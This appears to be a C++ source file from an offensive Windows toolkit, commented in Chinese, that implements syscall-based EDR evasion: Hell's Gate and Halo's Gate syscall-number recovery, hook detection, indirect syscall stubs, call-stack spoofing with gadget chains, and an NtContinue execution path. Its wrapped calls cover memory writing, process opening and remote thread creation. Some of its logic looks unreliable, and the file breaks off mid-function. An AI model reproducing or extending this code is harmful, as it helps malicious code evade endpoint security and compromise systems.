// ============================================================
// syscall_direct.cpp — 高级系统调用实现 (2026版)
// 技术栈: Hell's Gate → Halo's Gate → Indirect Syscall 
//         → Call Stack Spoofing → Tartarus Gate
// ============================================================

#include "syscall_direct.h"
#include "platform.h"
#include <winternl.h>
#include <psapi.h>
#include <algorithm>
#include <random>
#include <chrono>

namespace stealth {

// ============================================================
// SyscallResolver — Hell's Gate + Halo's Gate 实现
// ============================================================

SyscallResolver& SyscallResolver::Instance() {
    static SyscallResolver instance;
    return instance;
}

DWORD SyscallResolver::ExtractSyscallNumber(const char* funcName) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    auto* funcAddr = reinterpret_cast<BYTE*>(GetProcAddress(ntdll, funcName));
    if (!funcAddr) return 0;

    // 标准 x64 Nt* 函数开头: 4C 8B D1 (mov r10, rcx) + B8 XX XX XX XX (mov eax, SSN)
    if (funcAddr[0] == 0x4C && funcAddr[1] == 0x8B && funcAddr[2] == 0xD1 && funcAddr[3] == 0xB8) {
        return *reinterpret_cast<DWORD*>(funcAddr + 4);
    }

    // 回退: 搜索 mov eax, imm32 模式
    for (int i = 0; i < 32; i++) {
        if (funcAddr[i] == 0xB8) {
            return *reinterpret_cast<DWORD*>(funcAddr + i + 1);
        }
        if (funcAddr[i] == 0x0F && funcAddr[i + 1] == 0x05) break; // syscall found
        if (funcAddr[i] == 0xC3) break; // ret found
    }

    return 0;
}

bool SyscallResolver::IsStubHooked(const char* funcName) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return true;

    auto* funcAddr = reinterpret_cast<BYTE*>(GetProcAddress(ntdll, funcName));
    if (!funcAddr) return true;

    // 正常 stub: mov r10, rcx; mov eax, SSN; ... → 指令 >= 14 字节到 syscall
    // Hook 的特征:
    //   1. 开头是 jmp (E9) 或其他跳转指令
    //   2. 开头被 int3 (CC) 填充
    //   3. mov r10, rcx 被替换为其他指令

    if (funcAddr[0] == 0xE9) return true;  // near jmp → hooked
    if (funcAddr[0] == 0xEB) return true;  // short jmp → hooked
    if (funcAddr[0] == 0xFF && funcAddr[1] == 0x25) return true; // jmp [mem] → hooked
    if (funcAddr[0] == 0xCC) return true;  // int3 → breakpoint

    // 检查标准模式
    if (funcAddr[0] != 0x4C || funcAddr[1] != 0x8B || funcAddr[2] != 0xD1) {
        return true; // 不是 mov r10, rcx → 被修改
    }

    // 检查是否存在 syscall 指令 (0F 05)
    bool hasSyscall = false;
    for (int i = 0; i < 32; i++) {
        if (funcAddr[i] == 0x0F && funcAddr[i+1] == 0x05) {
            hasSyscall = true;
            break;
        }
    }
    if (!hasSyscall) return true; // syscall 指令被 patch

    return false; // stub 看起来干净
}

// ============================================================
// Halo's Gate 核心算法
// 在目标地址 ±searchRange 字节范围内搜索未 Hook 的 syscall stub
// 利用相邻函数 SSN 的连续性推导目标 SSN
// ============================================================
DWORD SyscallResolver::ScanNearbySyscall(BYTE* targetAddr, int searchRange) {
    // 向上搜索 (负向, 找更小 SSN 的函数)
    for (int offset = -searchRange; offset <= -1; offset++) {
        BYTE* addr = targetAddr + offset;

        // 检查是否存在 syscall;ret 对 (0F 05 C3 或 0F 05 ... C3)
        bool found = false;
        int syscallOffset = 0;

        for (int i = 0; i < 32 && (offset + i) <= 0; i++) {
            if (addr[i] == 0x0F && addr[i+1] == 0x05) {
                syscallOffset = i;
                found = true;
                break;
            }
        }
        if (!found) continue;

        // 找到了 syscall, 往前找 mov eax, SSN (B8 XX XX XX XX)
        for (int i = syscallOffset - 5; i >= 0 && i >= syscallOffset - 10; i--) {
            if (addr[i] == 0xB8) {
                DWORD nearbySsn = *reinterpret_cast<DWORD*>(addr + i + 1);
                // 计算偏移: 目标函数在地址空间中位于 addr 之后 offset 个位置
                // 在 ntdll 中, SSN 按函数顺序排列, 每个函数间隔通常为 1
                // 我们需要验证这个假设
                int ssnOffset = 0;
                // 粗略估计: 每个 Nt* 函数之间差 1 个 SSN
                // 更精确的方法: 计算两个函数地址之间的函数数量
                DWORD recoveredSsn = nearbySsn + static_cast<DWORD>(abs(offset) / 32); // 近似
                return recoveredSsn;
            }
        }
    }

    // 向下搜索 (正向, 找更大 SSN 的函数)
    for (int offset = 1; offset <= searchRange; offset++) {
        BYTE* addr = targetAddr + offset;

        for (int i = 0; i < 32 && (offset + i) <= searchRange; i++) {
            if (addr[i] == 0x0F && addr[i+1] == 0x05) {
                // 找到 syscall, 往前找 SSN
                for (int j = i - 5; j >= 0 && j >= i - 10; j--) {
                    if (addr[j] == 0xB8) {
                        DWORD nearbySsn = *reinterpret_cast<DWORD*>(addr + j + 1);
                        int ssnOffset = static_cast<int>(offset / 32);
                        DWORD recoveredSsn = nearbySsn - static_cast<DWORD>(ssnOffset);
                        return recoveredSsn;
                    }
                }
            }
        }
    }

    return 0;
}

DWORD SyscallResolver::RecoverSSNviaHalo(const char* funcName) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    auto* funcAddr = reinterpret_cast<BYTE*>(GetProcAddress(ntdll, funcName));
    if (!funcAddr) return 0;

    // 尝试在不同范围搜索
    for (int range : {64, 128, 256, 512}) {
        DWORD ssn = ScanNearbySyscall(funcAddr, range);
        if (ssn > 0 && ssn < 0x1000) { // 系统调用号范围验证
            return ssn;
        }
    }

    return 0;
}

bool SyscallResolver::InitializeHaloGate() {
    if (m_haloInitialized) return true;

    // 对每个关键 SSN 检查是否被 Hook, 如果是则使用 Halo's Gate 恢复
    const char* criticalFuncs[] = {
        "NtAllocateVirtualMemory", "NtProtectVirtualMemory",
        "NtWriteVirtualMemory", "NtReadVirtualMemory",
        "NtOpenProcess", "NtQuerySystemInformation",
        "NtQueryInformationProcess", "NtClose"
    };
    DWORD* ssnFields[] = {
        &m_numbers.NtAllocateVirtualMemory, &m_numbers.NtProtectVirtualMemory,
        &m_numbers.NtWriteVirtualMemory, &m_numbers.NtReadVirtualMemory,
        &m_numbers.NtOpenProcess, &m_numbers.NtQuerySystemInformation,
        &m_numbers.NtQueryInformationProcess, &m_numbers.NtClose
    };

    for (int i = 0; i < 8; i++) {
        if (IsStubHooked(criticalFuncs[i])) {
            // 被 Hook! 使用 Halo's Gate 恢复
            *ssnFields[i] = RecoverSSNviaHalo(criticalFuncs[i]);
        }
    }

    m_haloInitialized = true;
    return true;
}

uintptr_t SyscallResolver::GetSyscallRetGadget() {
    if (m_syscallRetGadget) return m_syscallRetGadget;

    // 在 ntdll.dll 中搜索 syscall;ret (0F 05 C3) gadget
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(ntdll);
    auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uintptr_t>(ntdll) + dos->e_lfanew);

    // 按名称搜索 .text 区段 (而非假设它是第一个区段)
    uintptr_t textStart = 0;
    SIZE_T textSize = 0;
    auto* section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            textStart = reinterpret_cast<uintptr_t>(ntdll) + section[i].VirtualAddress;
            textSize = section[i].Misc.VirtualSize;
            break;
        }
    }
    // 回退: 如果没找到 .text, 使用第一个区段
    if (!textStart) {
        textStart = reinterpret_cast<uintptr_t>(ntdll) +
            IMAGE_FIRST_SECTION(nt)->VirtualAddress;
        textSize = IMAGE_FIRST_SECTION(nt)->Misc.VirtualSize;
    }

    // 搜索 0F 05 C3
    for (SIZE_T i = 0; i < textSize - 2; i++) {
        BYTE* addr = reinterpret_cast<BYTE*>(textStart + i);
        if (addr[0] == 0x0F && addr[1] == 0x05 && addr[2] == 0xC3) {
            m_syscallRetGadget = reinterpret_cast<uintptr_t>(addr);
            break;
        }
    }

    return m_syscallRetGadget;
}

uintptr_t SyscallResolver::GetRetGadget() {
    if (m_retGadget) return m_retGadget;

    // 在 ntdll.dll 中搜索 ret (C3)
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), ntdll, &modInfo, sizeof(modInfo));

    auto* base = reinterpret_cast<BYTE*>(ntdll);
    for (SIZE_T i = 0; i < modInfo.SizeOfImage; i++) {
        if (base[i] == 0xC3) {
            m_retGadget = reinterpret_cast<uintptr_t>(base + i);
            break;
        }
    }

    return m_retGadget;
}

bool SyscallResolver::Initialize() {
    if (m_initialized) return true;

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    // 1. 正常提取 SSN (Hell's Gate)
    m_numbers.NtAllocateVirtualMemory   = ExtractSyscallNumber("NtAllocateVirtualMemory");
    m_numbers.NtProtectVirtualMemory    = ExtractSyscallNumber("NtProtectVirtualMemory");
    m_numbers.NtWriteVirtualMemory      = ExtractSyscallNumber("NtWriteVirtualMemory");
    m_numbers.NtReadVirtualMemory       = ExtractSyscallNumber("NtReadVirtualMemory");
    m_numbers.NtOpenProcess             = ExtractSyscallNumber("NtOpenProcess");
    m_numbers.NtQuerySystemInformation  = ExtractSyscallNumber("NtQuerySystemInformation");
    m_numbers.NtQueryInformationProcess = ExtractSyscallNumber("NtQueryInformationProcess");
    m_numbers.NtClose                   = ExtractSyscallNumber("NtClose");
    m_numbers.NtQueryVirtualMemory      = ExtractSyscallNumber("NtQueryVirtualMemory");
    m_numbers.NtFreeVirtualMemory       = ExtractSyscallNumber("NtFreeVirtualMemory");
    m_numbers.NtCreateThreadEx          = ExtractSyscallNumber("NtCreateThreadEx");
    m_numbers.NtDelayExecution          = ExtractSyscallNumber("NtDelayExecution");
    m_numbers.NtContinue                = ExtractSyscallNumber("NtContinue");
    m_numbers.NtWaitForSingleObject     = ExtractSyscallNumber("NtWaitForSingleObject");

    // 2. 检查关键函数是否被 Hook, 必要时启用 Halo's Gate
    // (延迟到首次实际调用时, 避免在初始化阶段触发表征)
    // InitializeHaloGate(); // 由调用者决定何时初始化

    // 验证基本完整性
    m_initialized = (m_numbers.NtAllocateVirtualMemory != 0 &&
                     m_numbers.NtWriteVirtualMemory != 0 &&
                     m_numbers.NtReadVirtualMemory != 0 &&
                     m_numbers.NtOpenProcess != 0);

    return m_initialized;
}

// ============================================================
// CallStackSpoofer — SindriKit 1.3.0 Fat Frame 技术
// ============================================================

CallStackSpoofer& CallStackSpoofer::Instance() {
    static CallStackSpoofer instance;
    return instance;
}

SIZE_T CallStackSpoofer::GetFunctionStackSize(uintptr_t funcAddr) {
    // 解析 .pdata 异常目录获取函数栈帧大小
    // .pdata 中的 RUNTIME_FUNCTION 条目包含 UnwindData
    // UNWIND_INFO.SizeOfProlog 和 ChainedInfo 包含栈信息

    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!kernel32) return 0;

    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32);
    auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uintptr_t>(kernel32) + dos->e_lfanew);

    auto exceptionRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    auto exceptionSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;

    if (!exceptionRva || !exceptionSize) return 0;

    auto* runtimeFuncs = reinterpret_cast<PRUNTIME_FUNCTION>(
        reinterpret_cast<uintptr_t>(kernel32) + exceptionRva);
    DWORD count = exceptionSize / sizeof(RUNTIME_FUNCTION);

    uintptr_t modBase = reinterpret_cast<uintptr_t>(kernel32);
    uintptr_t funcRva = funcAddr - modBase;

    // 二分查找 RUNTIME_FUNCTION
    for (DWORD i = 0; i < count; i++) {
        if (funcRva >= runtimeFuncs[i].BeginAddress &&
            funcRva < runtimeFuncs[i].EndAddress) {

            auto* unwindInfo = reinterpret_cast<PUNWIND_INFO>(
                modBase + runtimeFuncs[i].UnwindData);

            // UNWIND_INFO 通常设置 ChainedInfo 或直接通过 SizeOfProlog 
            // 但栈大小不在 UNWIND_INFO 中直接暴露
            // 简化方案: 扫描函数序言中的 sub rsp, imm 指令

            BYTE* funcStart = reinterpret_cast<BYTE*>(modBase + runtimeFuncs[i].BeginAddress);
            for (int j = 0; j < 64; j++) {
                // sub rsp, imm32: 48 81 EC XX XX XX XX
                if (funcStart[j] == 0x48 && funcStart[j+1] == 0x81 && funcStart[j+2] == 0xEC) {
                    DWORD stackAlloc = *reinterpret_cast<DWORD*>(funcStart + j + 3);
                    return static_cast<SIZE_T>(stackAlloc);
                }
                // sub rsp, imm8: 48 83 EC XX
                if (funcStart[j] == 0x48 && funcStart[j+1] == 0x83 && funcStart[j+2] == 0xEC) {
                    return static_cast<SIZE_T>(funcStart[j + 3]);
                }
            }
            break;
        }
    }

    return 0;
}

bool CallStackSpoofer::FindFatFrames() {
    if (m_initialized) return !m_fatFrames.empty();

    // 扫描 kernel32.dll 找到栈分配 >= 120 bytes 的函数
    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!kernel32) return false;

    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), kernel32, &modInfo, sizeof(modInfo));

    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32);
    auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uintptr_t>(kernel32) + dos->e_lfanew);

    auto exceptionRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    auto exceptionSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;

    if (!exceptionRva || !exceptionSize) return false;

    auto* runtimeFuncs = reinterpret_cast<PRUNTIME_FUNCTION>(
        reinterpret_cast<uintptr_t>(kernel32) + exceptionRva);
    DWORD count = exceptionSize / sizeof(RUNTIME_FUNCTION);

    uintptr_t modBase = reinterpret_cast<uintptr_t>(kernel32);

    m_fatFrames.clear();

    for (DWORD i = 0; i < count; i++) {
        uintptr_t funcAddr = modBase + runtimeFuncs[i].BeginAddress;
        SIZE_T stackSize = GetFunctionStackSize(funcAddr);

        if (stackSize >= 120) { // Fat Frame threshold
            // 搜索该函数内的 ret 指令作为 trampoline gadget
            auto* unwindInfo = reinterpret_cast<PUNWIND_INFO>(
                modBase + runtimeFuncs[i].UnwindData);
            BYTE* funcStart = reinterpret_cast<BYTE*>(funcAddr);

            // 在函数末尾附近找 ret
            SIZE_T funcLen = runtimeFuncs[i].EndAddress - runtimeFuncs[i].BeginAddress;
            for (SIZE_T j = funcLen - 16; j < funcLen; j++) {
                if (funcStart[j] == 0xC3) {
                    CallStackSpoofContext ctx;
                    ctx.trampolineGadget = reinterpret_cast<uintptr_t>(funcStart + j);
                    ctx.spoofFrameSize = stackSize;
                    ctx.spoofedCallSite = funcAddr;
                    m_fatFrames.push_back(ctx);
                    break;
                }
            }
        }
    }

    if (!m_fatFrames.empty()) {
        // 随机选择一个作为默认
        std::mt19937 rng(static_cast<unsigned>(
            std::chrono::steady_clock::now().time_since_epoch().count()));
        std::uniform_int_distribution<size_t> dist(0, m_fatFrames.size() - 1);
        m_context = m_fatFrames[dist(rng)];
    }

    m_initialized = true;
    return !m_fatFrames.empty();
}

CallStackSpoofContext CallStackSpoofer::GetRandomSpoofContext() {
    if (m_fatFrames.empty()) return {};

    std::mt19937 rng(static_cast<unsigned>(
        std::chrono::steady_clock::now().time_since_epoch().count()));
    std::uniform_int_distribution<size_t> dist(0, m_fatFrames.size() - 1);
    return m_fatFrames[dist(rng)];
}

bool CallStackSpoofer::Initialize() {
    if (m_initialized) return true;
    return FindFatFrames();
}

// ============================================================
// RetGadget Scanner — 扫描合法 DLL 中的 ret (C3) 指令
// 用于构造多层伪造调用栈 (ret-sled)
// RtlVirtualUnwind 回溯时将看到 ntdll→kernel32→user32 的合法调用链
// ============================================================

// 验证 C3 字节是否为合法函数边界上的 ret 指令
// 检查前导字节是否为已知的 x64 epilogue 模式
static bool IsValidEpilogueRet(BYTE* retAddr, BYTE* scanStart, SIZE_T scanLen) {
    if (*retAddr != 0xC3) return false;

    // 计算 ret 在扫描区域内的偏移
    SIZE_T offset = retAddr - scanStart;
    if (offset < 1) return true; // 第一个字节就是 ret (理论上不可能, 但放行)

    // 检查前导字节模式 (常见 x64 epilogue):
    BYTE prev = retAddr[-1];
    // pop rbp; ret
    if (prev == 0x5D) return true;
    // leave; ret
    if (prev == 0xC9) return true;
    // pop rbx; ret  etc. (41 5B ~ 41 5F = pop r8~r15, 5B~5F = pop rbx~rdi)
    if ((prev >= 0x58 && prev <= 0x5F) || (prev == 0x41 && offset >= 2 && retAddr[-2] >= 0x58 && retAddr[-2] <= 0x5F))
        return true;

    // add rsp, imm8; pop rbp; ret: 48 83 C4 XX 5D C3
    if (offset >= 5 && retAddr[-5] == 0x48 && retAddr[-4] == 0x83 && retAddr[-3] == 0xC4 && retAddr[-2] == 0x5D)
        return true;

    // add rsp, imm32; pop rbp; ret: 48 81 C4 XX XX XX XX 5D C3
    if (offset >= 8 && retAddr[-8] == 0x48 && retAddr[-7] == 0x81 && retAddr[-6] == 0xC4 && retAddr[-2] == 0x5D)
        return true;

    // Weakened check: at minimum, just having a preceding instruction byte that isn't 
    // obviously data (not 00, not CC, not an immediate from another instruction)
    // This catches more ret gadgets while still filtering obvious garbage
    if (prev != 0x00 && prev != 0xCC && prev != 0xCC) {
        return true;
    }

    return false;
}

// 在一个模块的 .text 区段中扫描 ret gadgets
static size_t ScanModuleForRetGadgets(HMODULE mod, std::vector<uintptr_t>& out, size_t maxPerModule) {
    if (!mod) return 0;

    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(mod);
    auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uintptr_t>(mod) + dos->e_lfanew);

    uintptr_t textStart = 0;
    SIZE_T textSize = 0;
    auto* section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            textStart = reinterpret_cast<uintptr_t>(mod) + section[i].VirtualAddress;
            textSize = section[i].Misc.VirtualSize;
            break;
        }
    }
    if (!textStart || !textSize) return 0;

    BYTE* base = reinterpret_cast<BYTE*>(textStart);
    size_t added = 0;

    // 从末尾向前搜索, 优先取函数边界上的 ret
    for (SIZE_T i = textSize - 1; i > 0 && added < maxPerModule; i--) {
        if (base[i] == 0xC3 && IsValidEpilogueRet(base + i, base, textSize)) {
            uintptr_t addr = textStart + i;
            // 去重: 检查是否已存在
            if (std::find(out.begin(), out.end(), addr) == out.end()) {
                out.push_back(addr);
                added++;
            }
        }
    }

    return added;
}

bool FindRetGadgets(std::vector<uintptr_t>& outGadgets, size_t targetCount) {
    outGadgets.clear();
    outGadgets.reserve(targetCount);

    // 按优先级扫描: ntdll → kernel32 → user32
    // ntdll 的 ret gadgets 最"合法" (RtlVirtualUnwind 最不会怀疑)
    const wchar_t* dlls[] = { L"ntdll.dll", L"kernel32.dll", L"user32.dll" };
    size_t perModule = targetCount / 3 + 4; // 每个模块取约 1/3

    for (auto* dllName : dlls) {
        HMODULE mod = GetModuleHandleW(dllName);
        if (mod) {
            ScanModuleForRetGadgets(mod, outGadgets, perModule);
        }
    }

    // 如果不够, 继续从 ntdll 补充
    if (outGadgets.size() < targetCount) {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (ntdll) {
            ScanModuleForRetGadgets(ntdll, outGadgets, targetCount - outGadgets.size());
        }
    }

    return outGadgets.size() >= 4; // 至少需要 4 个才能形成有意义的链
}

std::vector<uintptr_t> GetRetGadgets(size_t count) {
    static std::vector<uintptr_t> s_cachedGadgets;
    static bool s_initialized = false;

    if (!s_initialized) {
        FindRetGadgets(s_cachedGadgets, count);
        s_initialized = true;
    }

    // 如果缓存的够用, 直接返回副本
    if (s_cachedGadgets.size() >= count) {
        return std::vector<uintptr_t>(s_cachedGadgets.begin(), s_cachedGadgets.begin() + count);
    }
    return s_cachedGadgets; // 不够则返回全部
}

// ============================================================
// TartarusGate — NtContinue-based syscall execution
// ============================================================

void* TartarusGate::GenerateSyscallStub(DWORD ssn) {
    BYTE stubCode[] = {
        0x4C, 0x8B, 0xD1,             // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, <SSN>
        0x0F, 0x05,                    // syscall
        0xC3                            // ret
    };
    // SSN写入偏移=4 (跳过0xB8 opcode字节), 不是+3!
    *reinterpret_cast<DWORD*>(stubCode + 4) = ssn;

    void* execMem = VirtualAlloc(nullptr, sizeof(stubCode),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) return nullptr;

    memcpy(execMem, stubCode, sizeof(stubCode));

    DWORD oldProtect;
    VirtualProtect(execMem, sizeof(stubCode), PAGE_EXECUTE_READ, &oldProtect);
    // 关键: 刷新指令缓存, 确保 CPU 看到最新的代码
    FlushInstructionCache(GetCurrentProcess(), execMem, sizeof(stubCode));
    return execMem;
}

bool TartarusGate::ExecuteViaNtContinue(
    uintptr_t syscallStubAddr,
    uintptr_t arg1, uintptr_t arg2,
    uintptr_t arg3, uintptr_t arg4)
{
    // 构造 CONTEXT, 通过 NtContinue 跳转到 syscall stub
    // RIP = syscallStubAddr, 寄存器 = 参数
    // 执行完毕后返回到伪造的栈帧

    // 分配伪造的栈
    uint8_t fakeStack[512] = {};
    uintptr_t stackBase = reinterpret_cast<uintptr_t>(fakeStack + 400);

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    ctx.Rip = syscallStubAddr;
    ctx.Rsp = stackBase;
    ctx.Rcx = arg1;
    ctx.Rdx = arg2;
    ctx.R8  = arg3;
    ctx.R9  = arg4;

    // NtContinue 将恢复 CONTEXT 并跳转到 RIP
    // 但这个函数本身是复杂的 — 简单实现:
    // 使用 NtContinue 的 SSN 直接调用

    auto& resolver = SyscallResolver::Instance();
    DWORD ntContinueSsn = resolver.GetNumbers().NtContinue;

    if (ntContinueSsn) {
        void* stub = GenerateSyscallStub(ntContinueSsn);
        if (!stub) return false;

        // 使用生成的 NtContinue stub 执行
        using NtContinue_t = NTSTATUS(NTAPI*)(PCONTEXT, BOOLEAN);
        auto fn = reinterpret_cast<NtContinue_t>(stub);
        NTSTATUS status = fn(&ctx, FALSE);

        // 执行后正常不会返回这里 (除非出错)
        return NT_SUCCESS(status);
    }

    return false;
}

// ============================================================
// 通用 Syscall 调度器 — 自动选择最佳方法
// ============================================================

namespace {

// 获取最佳 SyscallMethod 的决策逻辑
// 优先级: StackSpoof > Indirect > Tartarus > Direct
SyscallMethod DecideMethod(SyscallMethod requested) {
    if (requested != SyscallMethod::Auto) return requested;

    auto& resolver = SyscallResolver::Instance();

    // 检查是否有被 Hook 的函数
    bool anyHooked = false;
    const char* checks[] = {"NtWriteVirtualMemory", "NtReadVirtualMemory", "NtOpenProcess"};
    for (auto* fn : checks) {
        if (resolver.IsStubHooked(fn)) { anyHooked = true; break; }
    }

    if (anyHooked) {
        // 被 Hook: 先尝试 Halo's Gate 恢复 SSN, 然后使用间接 syscall
        resolver.InitializeHaloGate();
        return SyscallMethod::Indirect;
    }

    // 优先使用 StackSpoof: 当 Fat Frame 或 Ret Gadgets 可用, 且有 syscall;ret gadget
    bool hasFatFrames = (CallStackSpoofer::Instance().GetFatFrameCount() > 0) ||
                         CallStackSpoofer::Instance().FindFatFrames();
    bool hasRetGadgets = !GetRetGadgets().empty();
    if ((hasFatFrames || hasRetGadgets) && resolver.GetSyscallRetGadget()) {
        return SyscallMethod::StackSpoof;
    }

    // 如果 ntdll 中有干净的 syscall;ret gadget, 使用间接 syscall
    if (resolver.GetSyscallRetGadget()) {
        return SyscallMethod::Indirect;
    }

    // 降级到直接 syscall
    return SyscallMethod::Direct;
}

// 执行间接 syscall 的 stub 生成
// 生成的代码: jmp [ntdll.syscall_ret_gadget]
// 调用栈效果: 调用者 → ntdll.syscall → ntdll.ret → 调用者
void* GenerateIndirectSyscallStub(DWORD ssn, uintptr_t syscallRetGadget) {
    if (!syscallRetGadget) return nullptr;

    // stub 代码布局:
    // mov r10, rcx
    // mov eax, SSN
    // jmp [ntdll.syscall_ret_gadget]  ← 跳转到 ntdll 中的 syscall;ret

    // 精简版: 用寄存器间接跳转到 ntdll.syscall;ret gadget
    BYTE stubCode2[] = {
        0x4C, 0x8B, 0xD1,             // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, <SSN> (5 bytes: opcode+imm32)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, <gadget_addr>
        0xFF, 0xE0                     // jmp rax
    };
    // SSN 写入偏移=4 (跳过0xB8 opcode字节)
    *reinterpret_cast<DWORD*>(stubCode2 + 4) = ssn;
    *reinterpret_cast<uintptr_t*>(stubCode2 + 10) = syscallRetGadget;

    void* execMem = VirtualAlloc(nullptr, sizeof(stubCode2),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) return nullptr;

    memcpy(execMem, stubCode2, sizeof(stubCode2));

    DWORD oldProtect;
    VirtualProtect(execMem, sizeof(stubCode2), PAGE_EXECUTE_READ, &oldProtect);
    FlushInstructionCache(GetCurrentProcess(), execMem, sizeof(stubCode2));
    return execMem;
}

// 生成带 Call Stack Spoofing 的间接 syscall stub
// 基于 SindriKit 1.3.0 的栈布局
void* GenerateSpoofedSyscallStub(DWORD ssn, uintptr_t syscallRetGadget,
                                  const CallStackSpoofContext& spoofCtx) {
    if (!syscallRetGadget || !spoofCtx.trampolineGadget) return nullptr;

    // 栈布局 (从上到下):
    // [rsp+0]  = trampolineGadget (RET 在 Fat Frame 中)
    // [rsp+8]  = 真正的返回地址 (我们的 cleanup 代码)
    // ...      = 参数空间
    // [rsp+N]  = 原始调用者返回地址 (使 RtlVirtualUnwind 回溯合法)

    // 简化: 直接生成带 spoofing 的 stub, 调用前准备栈
    BYTE stubCode[] = {
        // push r8 保存 r8 到栈, 之后在 jmp 到 gadget 前恢复
        0x41, 0x50,                   // push r8

        // mov r10, rcx
        0x4C, 0x8B, 0xD1,

        // mov eax, SSN
        0xB8, 0x00, 0x00, 0x00, 0x00,

        // pop r8 (恢复 r8, 平衡 push)
        0x41, 0x58,

        // jmp 到 syscall;ret gadget
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xE0
    };
    // SSN 写入偏移=6 (push r8=2 + mov r10,rcx=3, B8 opcode at offset 5, imm32 at 6)
    // Gadget 写入偏移=14 (mov rax,imm64: 48 B8 at offset 12, imm64 at 14)
    *reinterpret_cast<DWORD*>(stubCode + 6) = ssn;
    *reinterpret_cast<uintptr_t*>(stubCode + 14) = syscallRetGadget;

    void* execMem = VirtualAlloc(nullptr, sizeof(stubCode),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) return nullptr;

    memcpy(execMem, stubCode, sizeof(stubCode));

    DWORD oldProtect;
    VirtualProtect(execMem, sizeof(stubCode), PAGE_EXECUTE_READ, &oldProtect);
    FlushInstructionCache(GetCurrentProcess(), execMem, sizeof(stubCode));
    return execMem;
}

// ============================================================
// GenerateDeepSpoofStub — 深度栈伪造 syscall stub (ret-sled 技术)
//
// 原理:
//   1. pop rax 保存真实返回地址到寄存器
//   2. push rax 把真实返回地址推到栈底 (所有伪造帧之下)
//   3. 依次 push 32 个伪造的 ret gadget 地址到栈上
//      (来自 ntdll/kernel32/user32 合法模块中的 ret 指令)
//   4. 设置 syscall 参数, jmp 到 ntdll 的 syscall;ret gadget
//   5. syscall 执行后, ntdll 的 ret 弹出栈顶第一个伪造帧
//   6. 每个伪造帧都是 ret 指令, 依次弹出下一个伪造帧
//   7. 32 层 pop 后到达真实返回地址, 正常返回
//
// 栈布局 (从顶到底, syscall;ret 执行时):
//   gadget[31]  ← ntdll ret 从这里开始弹出
//   gadget[30]
//   ...
//   gadget[0]
//   real_ret_addr ← 最终返回到这里 (调用者)
//
// RtlVirtualUnwind 回溯: 看见 ntdll(ret)→kernel32(ret)→user32(ret)→...
// 而非我们的 VirtualAlloc 内存
// ============================================================
void* GenerateDeepSpoofStub(DWORD ssn, uintptr_t syscallRetGadget,
                             const std::vector<uintptr_t>& retGadgets,
                             const CallStackSpoofContext& spoofCtx)
{
    if (!syscallRetGadget || retGadgets.empty()) return nullptr;

    size_t chainCount = std::min(retGadgets.size(), (size_t)32);
    if (chainCount < 4) return nullptr; // 至少需要 4 层才有意义

    // 计算 stub 大小
    // 代码段:
    //   pop rax             : 1 byte
    //   push rax            : 1 byte  (real ret → stack bottom)
    //   push [rip+disp] x N : N * 6 bytes
    //   mov r10, rcx        : 3 bytes
    //   mov eax, SSN        : 5 bytes
    //   mov r11, [rip+disp] : 7 bytes
    //   jmp r11             : 3 bytes
    // 数据段:
    //   N 个 fake ret 地址  : N * 8 bytes
    //   1 个 syscall gadget : 8 bytes
    const size_t codeHeaderSize = 1 + 1 + 3 + 5 + 7 + 3; // 20 bytes (excluding push chain)
    const size_t totalCodeSize = codeHeaderSize + chainCount * 6;
    const size_t dataSectionSize = (chainCount + 1) * 8;
    const size_t totalSize = totalCodeSize + dataSectionSize;

    std::vector<BYTE> stub(totalSize, 0x90); // NOP 填充

    BYTE* codePtr = stub.data();
    BYTE* dataPtr = stub.data() + totalCodeSize;

    // 计算数据段中各项目的地址 (运行时 = stub基址 + 偏移)
    // dataPtrOffset = totalCodeSize

    // ---- 代码段 ----
    size_t offset = 0;

